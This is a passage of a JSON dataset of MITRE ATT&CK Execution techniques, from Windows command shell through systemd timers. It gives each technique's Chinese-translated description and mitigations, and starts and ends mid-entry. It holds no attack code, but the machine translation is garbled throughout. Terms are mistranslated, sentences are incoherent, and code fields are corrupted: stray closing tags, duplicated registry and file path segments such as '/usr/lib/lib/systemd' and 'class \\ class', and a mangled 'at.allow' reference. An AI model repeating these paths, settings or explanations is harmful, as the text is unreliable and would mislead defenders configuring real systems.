              "content": "要求在执行之前由受信任的开发人员ID签名所有AppleScript  - 这将防止随机的AppleScript代码执行。这将对AppleScript代码进行与其他通过Gatekeeper的其他.APP文件相同的审查。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在适当的情况下使用应用程序控件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.003",
    "name": "Windows Command Shell",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Windows命令外壳执行。Windows命令Shell（CMD）是Windows系统上的主要命令提示。Windows命令提示符可用于控制系统的几乎任何方面，并具有不同的命令子集所需的各种权限级别。可以通过远程服务（例如SSH）远程调用命令提示。"
        }
      ],
      [
        {
          "type": "text",
          "content": "批处理文件（ex：.bat或.cmd）还为Shell提供了要运行的顺序命令列表，以及正常的脚本操作，例如条件和循环。批处理文件的常见用途包括长或重复的任务，或者需要在多个系统上运行相同的命令集。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以利用CMD执行各种命令和有效载荷。常见用途包括CMD执行单个命令，或通过命令和控制频道转发输入并输出输出进行交互性滥用CMD。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在适当的情况下使用应用程序控件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.004",
    "name": "Unix Shell",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Unix Shell命令和脚本以执行。Unix Shell是Linux和MacOS系统上的主要命令提示符，尽管存在于特定的OS或分布的不同之处，但UNIX Shell的许多变化（例如SH，Bash，ZSH等）。Unix Shell可以控制系统的各个方面，并具有某些需要提高特权的命令。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Unix Shell还支持脚本，以实现命令的顺序执行以及其他典型的编程操作，例如条件和循环。Shell脚本的常见用途包括长或重复的任务，或者需要在多个系统上运行相同的命令集。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用UNIX外壳执行各种命令或有效载荷。可以通过命令和控制频道或横向运动（例如使用SSH）访问交互式外壳。对手还可以利用Shell脚本来交付和执行受害者的多个命令，也可以作为用于持久性的有效载荷的一部分。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在适当的情况下使用应用程序控件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.005",
    "name": "Visual Basic",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用视觉基本（VB）进行执行。VB是Microsoft创建的一种编程语言，其互操作性与许多Windows技术，例如组件对象模型和通过Windows API的本机API。尽管被标记为遗产，而没有计划的未来发展，但VB在.NET框架和跨平台.NET核心中得到了集成和支持。"
        }
      ],
      [
        {
          "type": "text",
          "content": "还创建了基于VB的派生语言，例如应用程序的Visual Basic（VBA）和VBScript。VBA是Microsoft Office内置的事件驱动的编程语言，也是几个第三方应用程序。VBA使文档可以包含用于自动执行任务和主机上其他功能的宏。VBScript是Windows主机上的一种默认脚本语言，也可以代替用于Internet Explorer的HTML应用程序（HTA）网页上的JavaScript（尽管大多数现代浏览器都不带有VBScript支持）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用VB有效载荷执行恶意命令。常见的恶意用法包括自动执行具有VBScript的行为，或将VBA内容嵌入矛盾的附件有效载荷中（这也可能涉及网上旁路旁路以启用执行）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "反病毒可自动隔离可疑文件。"
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止视觉基本脚本执行潜在的恶意下载内容。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭或限制对不需要的VB组件的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在适当的情况下使用应用程序控件。根据Windows版本2203的默认启动，可以从Internet获得的VBA宏（从Internet获得的Web（MOTW）属性标记）在Office应用程序中执行（例如：访问，Excel，PowerPoint，Visio和Word）。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "脚本阻止扩展可以帮助防止执行脚本和HTA文件，这些文件通常在剥削过程中使用。对于通过广告提供的恶意代码，Adblockers可以帮助防止该代码首先执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.006",
    "name": "Python",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Python命令和脚本进行执行。Python是一种非常流行的脚本/编程语言，具有执行许多功能的功能。可以从命令行（通过"
        },
        {
          "type": "code",
          "content": " python.exe "
        },
        {
          "type": "text",
          "content": "解释器）或可以通过脚本（.py）进行交互性执行Python，该脚本可以编写并分配给其他系统。Python代码也可以编译到二进制可执行文件中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Python配备了许多内置软件包，可以与基础系统进行交互，例如文件操作和设备I/O。对手可以使用这些库下载和执行命令或其他脚本以及执行各种恶意行为。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "反病毒可自动隔离可疑文件。"
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "未经授权的Python装置的库存系统。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "无需必需的denylist python。"
            }
          ]
        ]
      },
      {
        "id": "M1033",
        "name": "限制软件安装",
        "description": [
          [
            {
              "type": "text",
              "content": "防止用户在不需要的情况下安装Python。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.007",
    "name": "JavaScript",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用JavaScript的各种实现进行执行。JavaScript（JS）是一种独立于平台的脚本语言（在运行时汇总的次数），通常与网页中的脚本关联，尽管可以在浏览器外的运行时环境中执行JS。"
        }
      ],
      [
        {
          "type": "text",
          "content": "JScript是Microsoft实现相同的脚本标准。JScript通过Windows脚本引擎解释，因此与Windows的许多组件（例如Component Object Model和Internet Explorer HTML应用程序（HTA）页面（HTA）页面集成在一起。"
        }
      ],
      [
        {
          "type": "text",
          "content": "JavaScript for Automation（JXA）是一种基于JavaScript的MacOS脚本语言，作为Apple开放脚本体系结构（OSA）的一部分，它是在OSX 10.10中引入的。Apple的OSA提供了脚本的功能，可以控制应用程序，与操作系统接口以及桥梁访问苹果内部API的其余功能。从OSX 10.10开始，OSA仅支持两种语言JXA和AppleScript。可以通过命令行实用程序"
        },
        {
          "type": "code",
          "content": " osascript "
        },
        {
          "type": "text",
          "content": "执行脚本，可以通过"
        },
        {
          "type": "code",
          "content": " osacompile "
        },
        {
          "type": "text",
          "content": "将它们编译到应用程序或脚本文件中，并且可以通过编译和执行并执行并执行其他程序以通过利用Osakit框架。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用JavaScript的各种实现来执行各种行为。常见用途包括在网站上托管恶意脚本，这是作为妥协或下载和执行这些脚本文件作为辅助有效载荷的一部分。由于这些有效载荷是基于文本的，因此对手将其内容混淆为混淆文件或信息的一部分也很常见。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止JavaScript脚本执行潜在的恶意下载内容。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭或限制对不需要的脚本组件的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在适当的情况下，否定主义者脚本。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "脚本阻塞扩展可以帮助防止执行JavaScript和HTA文件，这些文件通常在剥削过程中使用。对于通过广告提供的恶意代码，Adblockers可以帮助防止该代码首先执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.008",
    "name": "Network Device CLI",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在网络设备上滥用脚本或内置命令行解释器（CLI），以执行恶意命令和有效载荷。CLI是用户和管理员与设备进行交互的主要手段，以查看系统信息，修改设备操作或执行诊断和管理功能。CLI通常包含不同命令所需的各种许可级别。"
        }
      ],
      [
        {
          "type": "text",
          "content": "脚本解释器自动化任务并将功能扩展到网络OS中包含的命令集之外。CLI和脚本解释器可通过直接的控制台连接或远程手段（例如Telnet或SSH）访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用网络CLI来改变网络设备的行为和操作方式。CLI可用于操纵流量以拦截或操纵数据，修改启动配置参数以加载恶意系统软件，或禁用安全功能或日志记录以避免检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "TACACS+可以通过配置身份验证和命令授权来控制哪些命令管理员可以使用哪些命令。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用身份验证，授权和会计（AAA）系统将限制管理员可以执行并提供用户操作的历史记录，以检测未经授权的使用和滥用。TACACS+可以控制哪些命令管理员可以通过配置身份验证和命令授权使用"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用身份验证，授权和会计（AAA）系统将限制用户可以执行的操作并提供用户操作的历史记录，以检测未经授权的使用和滥用。确保将最小特权原则应用于用户帐户和组，以便只有授权用户才能执行配置更改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.009",
    "name": "Cloud API",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用云API来执行恶意命令。在云环境中可用的API提供了各种功能，并且是用于对租户几乎所有方面的程序访问的功能丰富的方法。这些API可以通过各种方法（例如命令行解释器（CLI），浏览器内云外壳，PowerShell模块（如Azure for PowerShell）或软件开发人员套件（SDK）（SDK）（例如Python）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "云API功能可以允许在租户中的所有主要服务（例如计算，存储，身份和访问管理（IAM），网络和安全策略）中进行管理访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "有了适当的权限（通常是通过使用凭证（例如应用程序访问令牌和Web Session cookie）），对手可能会滥用云API来调用执行恶意操作的各种功能。例如，可以通过安装在云主持或本地主机上的二进制文件或通过许多云平台（例如AWS，Azure和GCP）提供的基于浏览器的云外壳访问的CLI和PowerShell功能。这些云外壳通常是包装的统一环境，用于使用CLI和/或脚本模块作为云环境中的容器。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在适当的情况下，使用应用程序控制，以阻止使用PowerShell CMDLET或其他基于主机的资源来访问云API资源。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用适当的身份和访问管理（IAM）以及基于角色的访问控制（RBAC）策略来限制行动管理员可以执行并提供管理措施的历史记录，以检测未经授权的使用和滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1559.001",
    "name": "Component Object Model",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Inter-Process Communication",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用Windows组件对象模型（COM）进行本地代码执行。COM是本机Windows应用程序编程接口（API）的过程间通信（IPC）组件，可实现软件对象之间的交互，或实现一个或多个接口的可执行代码。通过COM，客户端对象可以调用服务器对象的方法，该方法通常是二进制动态链接库（DLL）或可执行文件（EXE）。远程COM执行由远程服务（例如分布式组件对象模型（DCOM））促进。"
        }
      ],
      [
        {
          "type": "text",
          "content": "暴露了各种COM接口，可以滥用，以通过C，C ++，Java和Visual Basic等各种编程语言调用任意执行。还存在特定的COM对象，可以直接执行代码执行以外的功能，例如创建计划的任务/作业，无归档下载/执行以及与特权升级和持久性有关的其他对手行为。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "应用隔离和沙箱",
        "description": [
          [
            {
              "type": "text",
              "content": "确保启用所有com警报和受保护的视图。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "修改注册表设置（直接或使用dcomcnfg.exe）在"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\\\ software \\\\ class \\\\ class \\\\ appid \\\\ {appid_guid} "
            },
            {
              "type": "text",
              "content": "与与各个com应用程序的流程范围安全性关联的安全性相关联。"
            }
          ],
          [
            {
              "type": "text",
              "content": "修改注册表设置（直接或使用dcomcnfg.exe）"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\\\ software \\\\ microsoft \\\\ microsoft \\\\ ole "
            },
            {
              "type": "text",
              "content": "与系统范围的安全默认值相关联的所有com应用程序，这些应用程序均不设置自己的过程wide winde winde Security Security。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1559.002",
    "name": "Dynamic Data Exchange",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Inter-Process Communication",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用Windows动态数据交换（DDE）执行任意命令。DDE是一次性和/或应用程序之间连续过程间通信（IPC）的客户端服务器协议。建立链接后，应用程序可以自主交换由字符串，暖数据链接（数据项更改时的通知），热数据链接（更改数据项的重复）和命令执行请求的自主交易。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对象链接和嵌入（OLE）或在文档之间链接数据的能力最初是通过DDE实现的。尽管被组件对象模型取代，但在Windows 10和Microsoft Office 2016的大部分地区都可以通过注册表键启用DDE。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Microsoft Office文档可以直接或通过嵌入式文件中毒DDE命令中毒，并用于通过网络钓鱼活动或托管Web内容进行执行，以避免使用Visual Basic for Application（VBA）宏。同样，对手可能会通过将DDE公式嵌入到旨在通过Windows电子表格程序打开的CSV文件中，以将有效载荷嵌入受害设备上的应用程序和/或命令。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DDE也可以由在被折磨的机器上操作的对手来利用，该机器无法直接访问命令和脚本解释器。DDE执行可以通过远程服务（例如分布式组件对象模型（DCOM））远程调用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "应用隔离和沙箱",
        "description": [
          [
            {
              "type": "text",
              "content": "确保启用受保护的视图。"
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止DDE攻击和从办公室程序产卵。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将特定于Microsoft Office功能控制安全性的注册表键设置为禁用自动DDE/OLE执行。Microsoft还创建并默认启用了注册表键，以完全禁用Word和Excel中的DDE执行。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑在OneNote等办公程序中禁用嵌入式文件，而OneNote则无法使用受保护的视图。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1559.003",
    "name": "XPC Services",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Inter-Process Communication",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以为XPC服务守护程序提供恶意内容以进行本地代码执行。MACOS使用XPC服务在各种过程之间进行基本的过程间通信，例如XPC Service Daemon和第三方应用程序特权辅助工具。应用程序可以使用低级XPC服务"
        },
        {
          "type": "code",
          "content": " c api "
        },
        {
          "type": "text",
          "content": "或高级"
        },
        {
          "type": "code",
          "content": " nsxpcconnection api </code </code </code "
        },
        {
          "type": "text",
          "content": "来处理任务需要提高特权（例如网络连接）。应用程序负责提供作为XPC服务蓝图的协议定义。开发人员通常使用XPC服务来提供应用程序稳定性和应用程序客户和守护程序之间的特权分离。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以滥用XPC服务来执行恶意内容。恶意执行请求可以通过应用程序的XPC服务处理程序传递。这还可能包括识别和滥用不正确的XPC客户端验证和/或对输入参数的不良消毒以进行特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "应用程序开发人员指导",
        "description": [
          [
            {
              "type": "text",
              "content": "在开发应用程序时启用硬化的运行时能力。请勿包含"
            },
            {
              "type": "code",
              "content": " com.apple.security.get-task-allow "
            },
            {
              "type": "text",
              "content": "，其值设置为true的任何变化。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.002",
    "name": "At",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用实用程序，以执行任务计划，以初始或重复执行恶意代码。AT实用程序作为Windows，Linux和MacOS中的可执行文件存在，用于在指定的时间和日期安排任务。尽管对Windows环境中的计划任务的SCHTASK进行了弃用，但使用AT要求运行任务调度程序服务，并且用户将作为本地管理员组的成员登录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS上，可以由Superuser以及添加到"
        },
        {
          "type": "code",
          "content": " at.allow "
        },
        {
          "type": "text",
          "content": "文件中的任何用户调用。如果"
        },
        {
          "type": "code",
          "content": " at.allow "
        },
        {
          "type": "text",
          "content": "文件不存在，则选中"
        },
        {
          "type": "code",
          "content": " at.deny "
        },
        {
          "type": "text",
          "content": "文件。允许在"
        },
        {
          "type": "code",
          "content": " at.deny "
        },
        {
          "type": "text",
          "content": "中未列出的每个用户名。如果存在"
        },
        {
          "type": "code",
          "content": " at。存在"
        },
        {
          "type": "text",
          "content": "是空的，则允许AT的全局使用。如果两个文件都不存在（通常是基线），则仅允许超级用户使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用AT在系统启动或计划持久的基础上执行程序。也可以滥用AT作为横向移动的一部分进行远程执行和/或在指定帐户（例如系统）的上下文下运行一个过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux环境中，对手也可能会滥用通过使用任务产生交互式系统外壳或运行系统命令来破坏受限环境。类似地，如果允许二进制通过"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "作为超级用户运行，则在特权上也可以使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "诸如PowerSploit框架之类的工具包包含可用于探索系统弱点的系统弱点的动力模块，该系统可用于升级特权。Windows操作系统还创建了一个注册表密钥，该密钥专门与目标主机上的计划任务相关联：Microsoft \\ Windows \\ Windows NT \\ CurrentVersion \\ Schedule \\ Schedule \\ task Cache \\ task Cache \\ tree \\ at1。在Linux和MacOS环境中，可以在本地审核</code>使用<code>的计划任务，也可以通过中央收集的日志记录，使用Syslog或从主机中审核事件进行审核。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "为计划任务配置设置，以强制任务在身份验证的帐户的上下文中运行，而不是允许它们作为系统运行。关联的注册表密钥位于"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ Control \\ LSA \\ submitControl "
            },
            {
              "type": "text",
              "content": "。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>安全选项：域控制器：允许服务器操作员安排任务，设置为禁用。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "配置增加计划优先级选项，以仅允许管理员组安排优先过程的权利。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户权利分配：增加计划优先级。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能在远程系统上创建计划的任务。在Linux环境中，可以使用"
            },
            {
              "type": "code",
              "content": " at.allow "
            },
            {
              "type": "text",
              "content": "和"
            },
            {
              "type": "code",
              "content": " at.deny "
            },
            {
              "type": "text",
              "content": "文件来管理用户帐户级访问</code> at </code>。AT.Allow中列出的用户可以安排使用AT的操作，而在at.deny文件中列出的用户已禁用实用程序。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.003",
    "name": "Cron",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "实用程序以执行任务计划以初始或重复执行恶意代码。"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "实用程序是类似于Unix的操作系统的基于时间的工作调度程序。"
        },
        {
          "type": "code",
          "content": " crontab "
        },
        {
          "type": "text",
          "content": "文件包含要运行的cron条目的时间表以及指定的执行时间。任何"
        },
        {
          "type": "code",
          "content": " crontab "
        },
        {
          "type": "text",
          "content": "文件都存储在操作系统特定的文件路径中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在Linux或Unix环境中使用"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "在系统启动或计划的基础上执行程序以进行持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "查看"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "时间表的更改。"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "可以在"
            },
            {
              "type": "code",
              "content": "/var/log "
            },
            {
              "type": "text",
              "content": "目录中审查执行。要验证"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "日志文件的位置，请在"
            },
            {
              "type": "code",
              "content": " /etc/rsyslog.conf "
            },
            {
              "type": "text",
              "content": " </code>或"
            },
            {
              "type": "code",
              "content": " /etc/syslog.conf </code "
            },
            {
              "type": "text",
              "content": "中检查syslog配置。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": ""
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "权限由"
            },
            {
              "type": "code",
              "content": " /etc/cron.allow和/etc/cron.deny "
            },
            {
              "type": "text",
              "content": "控制。如果有一个"
            },
            {
              "type": "code",
              "content": " cron.allow "
            },
            {
              "type": "text",
              "content": "文件，则需要在文件中列出"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "的用户或用户。"
            },
            {
              "type": "code",
              "content": " cron.deny "
            },
            {
              "type": "text",
              "content": "用于明确禁止用户使用cron。如果两者都不存在，则只允许超级用户运行cron。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.005",
    "name": "Scheduled Task",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Windows任务调度程序，以执行任务计划以初始或重复执行恶意代码。有多种方法可以访问Windows中的任务调度程序。Schtasks实用程序可以直接在命令行上运行，也可以在控制面板的管理员工具部分中通过GUI打开任务调度程序。在某些情况下，对手已经为Windows任务调度程序使用了.NET包装器，或者，对手使用Windows NetApi32库来创建计划的任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手（例如：at）也可能会滥用实用程序的弃用，尽管"
        },
        {
          "type": "code",
          "content": " at.exe "
        },
        {
          "type": "text",
          "content": "无法访问用"
        },
        {
          "type": "code",
          "content": " schtasks "
        },
        {
          "type": "text",
          "content": "或控制面板创建的任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用Windows任务调度程序在系统启动或计划的基础上执行程序以进行持久性。Windows任务调度程序还可以滥用以作为横向移动的一部分进行远程执行和/或在指定帐户的上下文（例如系统）下运行过程。与系统二进制代理执行类似，对手也滥用了Windows任务调度程序，以在签名/受信任的系统流程下可能掩盖一次性执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以创建“隐藏”的计划任务（即隐藏文物），这些任务可能不可见，用于列举任务的工具和手动查询。具体而言，对手可以通过删除关联的安全描述符（SD）注册表值（必须使用系统权限完成此值的删除）来隐藏"
        },
        {
          "type": "code",
          "content": " schtasks /Query < /code < /code < /code>和任务调度程序的任务。对手也可以采用替代方法隐藏任务，例如更改关联注册表密钥中的元数据（例如 index "
        },
        {
          "type": "text",
          "content": "值）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "诸如PowerSploit框架之类的工具包包含可用于探索系统弱点的系统弱点的动力模块，该系统可用于升级特权。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "为计划任务配置设置，以强制任务在身份验证的帐户的上下文中运行，而不是允许它们作为系统运行。关联的注册表密钥位于HKLM \\ System \\ CurrentControlset \\ Control \\ LSA \\ submitControl。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>安全选项：域控制器：允许服务器操作员安排任务，设置为禁用。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "配置增加计划优先级选项，以仅允许管理员组安排优先过程的权利。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户权利分配：增加计划优先级。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能在远程系统上创建计划的任务。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.006",
    "name": "Systemd Timers",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用SystemD计时器来执行任务计划，以初始或重复执行恶意代码。SystemD计时器是具有文件扩展名"
        },
        {
          "type": "code",
          "content": " .timer "
        },
        {
          "type": "text",
          "content": "该控制服务的单位文件。可以将计时器设置为在日历事件上或相对于起点的时间跨度之后运行。它们可以用作Linux环境中CRON的替代方案。可以通过"
        },
        {
          "type": "code",
          "content": " systemctl "
        },
        {
          "type": "text",
          "content": "命令行实用程序来远程激活SystemD计时器，该实用程序可通过SSH运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "每个"
        },
        {
          "type": "code",
          "content": " .timer "
        },
        {
          "type": "text",
          "content": "文件必须具有相应的"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "带有相同名称的文件，例如"
        },
        {
          "type": "code",
          "content": " example.timer "
        },
        {
          "type": "text",
          "content": " and code> example.service.service.service </代码>。"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件是由SystemD System和Service Manager管理的SystemD Service单元文件。特权计时器写入"
        },
        {
          "type": "code",
          "content": "/etc/systemd/system/"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/usr/lib/lib/systemd/system "
